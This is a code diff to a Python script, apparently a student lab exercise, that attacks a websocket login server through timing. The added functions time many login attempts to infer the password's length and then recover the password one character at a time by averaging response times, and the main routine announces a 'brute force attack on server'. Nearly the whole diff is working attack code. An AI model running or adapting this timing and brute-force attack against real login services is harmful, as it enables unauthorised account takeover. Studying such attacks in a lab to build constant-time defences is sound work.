@@ -1,7 +1,8 @@
 import socket, sys, asyncio, websockets, json, time, string, operator, statistics
-from string import ascii_lowercase, digits
 import os
 import statistics
+import string
+import shutil
 
 async def client_stub(username, password):
     """Handle sending and receiving logins to/from the server.
@@ -68,16 +69,18 @@ def call_server(username, password):
     
     return reply, time_delta
 
-def test():
-   
-
+def find_real_password_length(password_length):
     # Read response times from the text file
     with open('output.txt', 'r') as f:
         lines = f.readlines()
         response_times = [float(line.split('=')[-1]) for line in lines]
 
     # Group response times into sets of 10
-    response_time_groups = [response_times[i:i+10] for i in range(0, len(response_times), 10)]
+    # Group response times into sets of password_length
+    response_time_groups = [response_times[i:i+password_length] for i in range(0, len(response_times), password_length)]
+
+    # Limit the number of groups to the user's input of password length
+    response_time_groups = response_time_groups[:password_length]
 
     # Calculate and print the average response time for each group
     for i, group in enumerate(response_time_groups):
@@ -85,7 +88,8 @@ def test():
     #Find and print the highest response time of the groups and print the index of the group
     max_group = max(response_time_groups, key=statistics.mean)
     print(f'Group with highest average response time: {response_time_groups.index(max_group)+1}')
-   
+    real_length_of_password = response_time_groups.index(max_group)+1
+    return real_length_of_password
 
 
 def length_password(username, passwordlength):
@@ -94,13 +98,14 @@ def length_password(username, passwordlength):
     for i in range(passwordlength):
         call_server("","")
         resultaat += "o"
-        for x in range(10):
+        for x in range(200):
             
             if len(resultaat) > 0:
                 reply,time_delta =call_server(username, resultaat)
 
                 save_output_to_txt('Sending login attempt for username: {} and password: {}'.format(username, resultaat)+ (" "*(passwordlength- len(resultaat)))+ ' response time = '+str(time_delta)+ '\n')
-
+                #print finding password length but keep it on the same line
+                print('Finding password length: {}'.format(len(resultaat)), end='\r')
 
 
 
@@ -158,19 +163,30 @@ def save_output_to_txt(output):
     return
 
 
-# make a function that takes all the resut times from output.txt and makes a histogram of it
-def make_histogram():
-    """Makes a histogram of the response times from the output.txt file.
-    """
-    
-    with open('output.txt', 'r') as f:
-        lines = f.readlines()
-        response_times = []
-        for line in lines:
-            if 'Access Granted!' in line:
-                response_times.append(float(line.split(' ')[-1]))
-    response_times.sort()
-    print_stats(response_times)
+
+
+def find_password(username, real_length_of_password):
+    password = 'a' * real_length_of_password
+    for i in range(real_length_of_password):
+        max_time = 0
+        for char in string.ascii_lowercase + string.digits:
+            times = []
+            for _ in range(100):
+                temp_password = password[:i] + char + password[i+1:]
+                _, time_delta = call_server(username, temp_password)
+                times.append(time_delta)
+            avg_time = statistics.mean(times)
+            if avg_time > max_time:
+                max_time = avg_time
+                password = temp_password
+    return password
+
+
+def dotter():
+    columns, _ = shutil.get_terminal_size()
+    for _ in range(columns):
+        print('.', end='', flush=True)
+        time.sleep(0.1)
     return
 
 
@@ -178,15 +194,23 @@ def main():
     """Main function. Loops through all possible passwords
     and sends them to the server.
     """
+    # Clear the output.txt file
+    open('output.txt', 'w').close()
+    clear_terminal()
+    username = input("Enter username:")
+    clear_terminal()
+    print('Starting brute force attack on server...')
+    #dotter()
+    clear_terminal()
 
-    username = '000000'
-   # password = 'hunter2'
-    passwordlength = int(input("Geef de lengte van de string: "))
+    passwordlength = int(input("Input max length of password: "))
     length_password(username, passwordlength)
     
-    #call_server(username, password)
-    print ('done')
-    test()
+
+    real_length_of_password = find_real_password_length(passwordlength)
+    print(real_length_of_password)
+    password = find_password(username, real_length_of_password)
+    print(password)
 
 if __name__ == '__main__':
     main()
